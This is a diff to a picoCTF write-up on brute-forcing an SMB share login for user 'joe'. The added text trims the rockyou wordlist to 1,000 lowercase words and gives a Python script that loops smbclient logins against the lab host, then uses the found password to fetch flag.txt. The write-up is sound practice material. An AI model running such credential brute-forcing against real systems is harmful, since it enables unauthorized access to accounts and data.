@@ -51,39 +51,46 @@ Try authenticating as `joe`:
     Password for [WORKGROUP\joe]:
     session setup failed: NT_STATUS_LOGON_FAILURE
 
-The note hints that **Joe is still using the default password**.  
-Start brute forcing with a small wordlist:
+Create a small wordlist and brute‑force with a Python script, with no success:
 
-    python3 bruteforcepassword.py
-    Testing: password
-    SUCCESS! Password is: password
+    $ python3 bruteforcepassword.py
 
-**(My first script had issues, so you switched approach based on hint 3.)**
+After the hint, download rockyou.txt:
 
-Then, after a hint, I fetched a better wordlist:
+    $ curl -L https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz -o rockyou.tar.gz
+    $ tar -xzf rockyou.tar.gz
 
-    curl -L https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz -o rockyou.tar.gz
-    tar -xzf rockyou.tar.gz
+Make a much smaller list (only lowercase words, first 1000):
 
-From here, I can probably:
+    $ wc -l rockyou.txt
+    7081926 rockyou.txt
+    
+    $ grep -E '^[a-z]+$' rockyou.txt > rockme.txt
+    $ head -1000 rockme.txt > rockme1000.txt
+    $ wc -l rockme1000.txt
+    1000 rockme1000.txt
 
-- Use `rockyou.txt` with a fixed username `joe` to brute force SMB login.
-- Once the correct password is found, connect:
+Run the brute‑force script again and get the password.
 
-      smbclient //green-hill.picoctf.net/secure-shares -p 55679 -U joe
+Then:
 
-- List and download `flag.txt`, then:
+    $ smbclient //green-hill.picoctf.net/secure-shares -p 56439 -U joe
+    Password for [WORKGROUP\joe]:
+    smb: \> ls
+    smb: \> get flag.txt
+    smb: \> exit
+    
+    $ cat flag.txt
 
-      cat flag.txt
-
-Here is my python script `bruteforcepassword.py`
+Here is my python script:
 ```python
 import subprocess
 
 host = "green-hill.picoctf.net"
-port = "58399"
+port = "56439"
 user = "joe"
-wordlist = "wordlist.txt"
+#wordlist = "goldenwordlist.txt"
+wordlist = "rockme1000.txt"
 
 with open(wordlist, "r", errors="ignore") as f:
     for password in f:
@@ -107,7 +114,7 @@ with open(wordlist, "r", errors="ignore") as f:
                 timeout=3
             )
 
-            if "NT_STATUS_LOGON_FAILURE" not in result.stderr:
+            if "NT_STATUS_LOGON_FAILURE" not in result.stdout:
                 print(f"\nSUCCESS! Password is: {password}")
                 break
 
